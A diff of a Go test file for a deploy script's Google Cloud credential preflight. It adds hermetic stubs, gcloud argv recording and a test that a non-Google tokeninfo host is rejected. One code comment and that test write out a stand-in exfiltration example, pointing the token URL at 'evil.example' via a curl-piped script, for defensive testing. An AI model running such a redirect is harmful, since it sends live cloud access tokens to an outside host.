@@ -24,6 +24,7 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
+	"sync/atomic"
 	"testing"
 
 	"github.com/GoogleCloudPlatform/scion/pkg/config"
@@ -110,86 +111,161 @@ func runBashFuncWithSetup(t *testing.T, setup, funcName string, args ...string) 
 
 // ---------------------------------------------------------------------------
 // Preflight: ADC credential check tests
+//
+// Two rules hold for every test in this section, and both were learned the
+// hard way in review r1:
+//
+//  1. HERMETIC. Every test points BOTH _DI_TOKENINFO_URL and _DI_API_BASE at a
+//     local stub. An earlier version of TestScriptPreflightFailsWithoutADC set
+//     neither, so it minted a real 1024-character access token, sent it to the
+//     real oauth2.googleapis.com/tokeninfo in a query string, called the real
+//     Cloud Run API — and then passed anyway, because the generic remedy string
+//     happened to appear in stderr. A unit test must never put a live
+//     cloud-platform credential on the network.
+//
+//  2. THE gcloud STUB ANSWERS ONLY THE ADC FORM, AND RECORDS ITS ARGV. Mocks
+//     of the shape `gcloud() { echo "ya29.fake"; }` answer any invocation, so
+//     they cannot tell `gcloud auth application-default print-access-token`
+//     (correct) from `gcloud auth print-access-token` (the bug being fixed).
+//     All four original tests passed against the buggy source. Recording argv
+//     and asserting on it is what pins the token source.
 // ---------------------------------------------------------------------------
 
-func TestScriptPreflightFailsWithoutADC(t *testing.T) {
-	// Mock gcloud so ADC print-access-token fails (simulates no ADC configured).
-	setup := `gcloud() {
-		if [[ "${1:-}" == "auth" ]] && [[ "${2:-}" == "application-default" ]] && [[ "${3:-}" == "print-access-token" ]]; then
-			echo "ERROR: Application Default Credentials are not available." >&2
-			return 1
-		fi
-		command gcloud "$@"
-	}`
+// gcloudArgvLog returns a path in the test's temp dir for the gcloud stub to
+// record its argv to, one invocation per line.
+func gcloudArgvLog(t *testing.T) string {
+	t.Helper()
+	return filepath.Join(t.TempDir(), "gcloud-argv.log")
+}
 
-	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
+// readGcloudArgvLog reads the argv recorded by a gcloud stub. It fails the
+// test if the stub was never invoked at all.
+func readGcloudArgvLog(t *testing.T, path string) string {
+	t.Helper()
+	data, err := os.ReadFile(path) //nolint:gosec // path is from t.TempDir()
+	require.NoError(t, err, "the gcloud stub recorded nothing — gcloud was never called")
+	return string(data)
+}
+
+// adcGcloudStub builds a bash gcloud() mock that records every invocation to
+// argvLog and answers ONLY `gcloud auth application-default print-access-token`.
+// Any other invocation is an error, which is what makes tests using this stub
+// fail if deploy.sh reverts to the non-ADC credential store.
+func adcGcloudStub(argvLog string) string {
+	return fmt.Sprintf(`gcloud() {
+  printf '%%s\n' "$*" >> %q
+  if [[ "$*" == "auth application-default print-access-token" ]]; then
+    printf '%%s\n' "ya29.fake-test-token"
+    return 0
+  fi
+  echo "test stub: unexpected gcloud invocation: gcloud $*" >&2
+  return 1
+}`, argvLog)
+}
+
+// brokenADCGcloudStub is adcGcloudStub with the ADC store unavailable: it
+// records argv, then fails whatever it is asked for. It simulates a machine
+// where `gcloud auth application-default login` has never been run.
+func brokenADCGcloudStub(argvLog string) string {
+	return fmt.Sprintf(`gcloud() {
+  printf '%%s\n' "$*" >> %q
+  if [[ "$*" == "auth application-default print-access-token" ]]; then
+    echo "ERROR: Application Default Credentials are not available." >&2
+    return 1
+  fi
+  echo "test stub: unexpected gcloud invocation: gcloud $*" >&2
+  return 1
+}`, argvLog)
+}
+
+// newPreflightStub serves both endpoints the preflight talks to: tokeninfo
+// (identified by the access_token query parameter) and the Cloud Run v2
+// instances API. The returned counter records how many requests arrived, so a
+// test can assert that nothing was sent at all.
+func newPreflightStub(t *testing.T, tokeninfoJSON string, apiStatus int, apiBody string) (*httptest.Server, *atomic.Int32) {
+	t.Helper()
+	var hits atomic.Int32
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		hits.Add(1)
+		if r.URL.Query().Get("access_token") != "" {
+			w.WriteHeader(http.StatusOK)
+			_, _ = io.WriteString(w, tokeninfoJSON)
+			return
+		}
+		w.WriteHeader(apiStatus)
+		_, _ = io.WriteString(w, apiBody)
+	})) //nolint:bodyclose // httptest server handler, not a client response
+	t.Cleanup(server.Close)
+	return server, &hits
+}
+
+// preflightSetup composes the bash prelude for a preflight test: the gcloud
+// stub, plus both test-only URL seams pointed at the stub server.
+func preflightSetup(gcloudStub, serverURL string) string {
+	return fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q", gcloudStub, serverURL, serverURL)
+}
+
+func TestScriptPreflightFailsWithoutADC(t *testing.T) {
+	// The stub server must never be touched: with no token there is nothing
+	// to validate, so the preflight has to abort before any request goes out.
+	server, hits := newPreflightStub(t, `{}`, http.StatusOK, `{}`)
+	argvLog := gcloudArgvLog(t)
+
+	_, stderr, exitCode := runBashFuncWithSetup(t,
+		preflightSetup(brokenADCGcloudStub(argvLog), server.URL),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project", "test-name")
+		"user@example.com", "us-east4", "test-project")
 
 	assert.NotEqual(t, 0, exitCode, "must fail when ADC is unavailable")
 	assert.Contains(t, stderr, "gcloud auth application-default login",
 		"error must name the exact remedy: gcloud auth application-default login")
+	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
+		"the token must be minted from Application Default Credentials — "+
+			"`gcloud auth print-access-token` reads a different credential store "+
+			"and returns a token type the Cloud Run v2 API rejects "+
+			"(ACCESS_TOKEN_TYPE_UNSUPPORTED)")
+	assert.Equal(t, int32(0), hits.Load(),
+		"nothing may be sent over the wire when no token could be minted")
 }
 
 func TestScriptPreflightAbortsOnNon2xxGet(t *testing.T) {
-	// Stub server: tokeninfo returns OK, but instances API returns 403.
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Query().Get("access_token") != "" {
-			// tokeninfo request
-			w.WriteHeader(http.StatusOK)
-			_, _ = fmt.Fprintf(w, `{"email":"user@example.com","email_verified":"true"}`)
-			return
-		}
-		// Instances API — reject
-		w.WriteHeader(http.StatusForbidden)
-		_, _ = fmt.Fprintf(w, `{"error":{"code":403,"message":"permission denied"}}`)
-	}))
-	defer server.Close()
+	// tokeninfo answers; the instances API rejects with 403.
+	server, _ := newPreflightStub(t,
+		`{"email":"user@example.com","email_verified":"true"}`,
+		http.StatusForbidden,
+		`{"error":{"code":403,"message":"permission denied"}}`)
+	argvLog := gcloudArgvLog(t)
 
-	setup := fmt.Sprintf(`gcloud() {
-		echo "ya29.fake-test-token"
-	}
-	_DI_API_BASE="%s"
-	_DI_TOKENINFO_URL="%s"`, server.URL, server.URL)
-
-	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
+	_, stderr, exitCode := runBashFuncWithSetup(t,
+		preflightSetup(adcGcloudStub(argvLog), server.URL),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project", "test-name")
+		"user@example.com", "us-east4", "test-project")
 
 	assert.NotEqual(t, 0, exitCode,
 		"must fail when validating GET returns non-2xx — this abort prevents "+
 			"step 3a from creating an Instance that step 3b cannot configure")
 	assert.Contains(t, stderr, "403",
 		"error must include the HTTP status code")
+	assert.Contains(t, stderr, "run.instances.list",
+		"a 403 means the credential is valid but unauthorized — the message must "+
+			"name the missing permission, not just tell the operator to re-login")
 	assert.Contains(t, stderr, "gcloud auth application-default login",
 		"error must name the remedy")
+	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
+		"the validated token must come from Application Default Credentials")
 }
 
 func TestScriptPreflightWarnsOnIdentityMismatch(t *testing.T) {
-	// Stub server: tokeninfo returns a different email than the gcloud account.
-	// Instances API returns 200.
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Query().Get("access_token") != "" {
-			// tokeninfo request — return a different identity
-			w.WriteHeader(http.StatusOK)
-			_, _ = fmt.Fprintf(w, `{"email":"adc-user@example.com","email_verified":"true"}`)
-			return
-		}
-		// Instances API — success
-		w.WriteHeader(http.StatusOK)
-		_, _ = fmt.Fprintf(w, `{}`)
-	}))
-	defer server.Close()
+	// tokeninfo reports a different email than the active gcloud account.
+	server, _ := newPreflightStub(t,
+		`{"email":"adc-user@example.com","email_verified":"true"}`,
+		http.StatusOK, `{}`)
+	argvLog := gcloudArgvLog(t)
 
-	setup := fmt.Sprintf(`gcloud() {
-		echo "ya29.fake-test-token"
-	}
-	_DI_API_BASE="%s"
-	_DI_TOKENINFO_URL="%s"`, server.URL, server.URL)
-
-	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
+	_, stderr, exitCode := runBashFuncWithSetup(t,
+		preflightSetup(adcGcloudStub(argvLog), server.URL),
 		"di_preflight_rest_credential",
-		"gcloud-user@example.com", "us-east4", "test-project", "test-name")
+		"gcloud-user@example.com", "us-east4", "test-project")
 
 	assert.Equal(t, 0, exitCode,
 		"identity mismatch is a warning, not a failure — a deliberate mismatch "+
@@ -200,37 +276,88 @@ func TestScriptPreflightWarnsOnIdentityMismatch(t *testing.T) {
 		"warning must name the gcloud account")
 	assert.Contains(t, stderr, "adc-user@example.com",
 		"warning must name the ADC identity")
+	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
+		"the compared identity must be the ADC identity")
+}
+
+// TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail pins the fix for
+// the false positive found in review r1. A service-account ADC token scoped to
+// cloud-platform gets a tokeninfo response with azp/aud/scope and NO email.
+// azp is a numeric client ID, so comparing it against the gcloud account's
+// email address can never match — the warning fired on every single
+// service-account run (metadata server, GCE, Cloud Shell, CI), which is alarm
+// fatigue on the exact signal the warning exists to carry.
+func TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail(t *testing.T) {
+	// Measured response shape from a real service-account ADC token.
+	server, _ := newPreflightStub(t,
+		`{"azp":"110532853671892060667","aud":"110532853671892060667",`+
+			`"scope":"https://www.googleapis.com/auth/cloud-platform","access_type":"online"}`,
+		http.StatusOK, `{}`)
+	argvLog := gcloudArgvLog(t)
+
+	stdout, stderr, exitCode := runBashFuncWithSetup(t,
+		preflightSetup(adcGcloudStub(argvLog), server.URL),
+		"di_preflight_rest_credential",
+		"operator@example.com", "us-east4", "test-project")
+
+	assert.Equal(t, 0, exitCode, "must succeed; stderr: %s", stderr)
+	assert.NotContains(t, stderr, "WARNING",
+		"must NOT warn: a numeric client ID can never equal an email address, so "+
+			"comparing them is a guaranteed false positive on every service-account ADC")
+	assert.Contains(t, stdout, "110532853671892060667",
+		"the client ID is still worth reporting")
+	assert.Contains(t, stdout, "skipped",
+		"the operator must be told the comparison was skipped, not left to infer "+
+			"a mismatch from two values that were never comparable")
 }
 
 func TestScriptPreflightSucceedsWithMatchingIdentity(t *testing.T) {
-	// Stub server: tokeninfo returns the same email as the gcloud account.
-	// Instances API returns 200.
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Query().Get("access_token") != "" {
-			w.WriteHeader(http.StatusOK)
-			_, _ = fmt.Fprintf(w, `{"email":"user@example.com","email_verified":"true"}`)
-			return
-		}
-		w.WriteHeader(http.StatusOK)
-		_, _ = fmt.Fprintf(w, `{}`)
-	}))
-	defer server.Close()
+	server, _ := newPreflightStub(t,
+		`{"email":"user@example.com","email_verified":"true"}`,
+		http.StatusOK, `{}`)
+	argvLog := gcloudArgvLog(t)
 
-	setup := fmt.Sprintf(`gcloud() {
-		echo "ya29.fake-test-token"
-	}
-	_DI_API_BASE="%s"
-	_DI_TOKENINFO_URL="%s"`, server.URL, server.URL)
-
-	stdout, stderr, exitCode := runBashFuncWithSetup(t, setup,
+	stdout, stderr, exitCode := runBashFuncWithSetup(t,
+		preflightSetup(adcGcloudStub(argvLog), server.URL),
 		"di_preflight_rest_credential",
-		"user@example.com", "us-east4", "test-project", "test-name")
+		"user@example.com", "us-east4", "test-project")
 
 	assert.Equal(t, 0, exitCode, "must succeed when all checks pass; stderr: %s", stderr)
 	assert.NotContains(t, stderr, "WARNING",
 		"must NOT warn when identities match")
 	assert.Contains(t, stdout, "ADC credential validated successfully",
 		"must confirm successful validation")
+	assert.Contains(t, stdout, server.URL,
+		"the tokeninfo URL must be echoed: the token travels to it in a query "+
+			"string, so a redirected endpoint must not be invisible in the output")
+	assert.Contains(t, readGcloudArgvLog(t, argvLog), "auth application-default print-access-token",
+		"the token must be minted from Application Default Credentials")
+}
+
+// TestScriptPreflightRejectsNonGoogleTokeninfoHost pins the narrowing of the
+// _DI_TOKENINFO_URL seam. The token reaches tokeninfo as a URL query
+// parameter, where the receiving host logs it, and the script is documented as
+// curl-able — so `_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)` is a
+// plausible copy-paste accident that exfiltrates a live cloud-platform
+// credential. The override is restricted to Google's hosts or loopback.
+func TestScriptPreflightRejectsNonGoogleTokeninfoHost(t *testing.T) {
+	argvLog := gcloudArgvLog(t)
+	setup := fmt.Sprintf("%s\n_DI_API_BASE=%q\n_DI_TOKENINFO_URL=%q",
+		adcGcloudStub(argvLog),
+		"http://127.0.0.1:1", // never reached
+		"https://evil.example/tokeninfo")
+
+	_, stderr, exitCode := runBashFuncWithSetup(t, setup,
+		"di_preflight_rest_credential",
+		"user@example.com", "us-east4", "test-project")
+
+	assert.NotEqual(t, 0, exitCode,
+		"must refuse to send an access token to a host outside googleapis.com")
+	assert.Contains(t, stderr, "evil.example",
+		"the rejection must name the offending host")
+	assert.NoFileExists(t, argvLog,
+		"the check must run BEFORE the token is minted — no token should exist "+
+			"to leak in the first place")
 }
 
 // ---------------------------------------------------------------------------
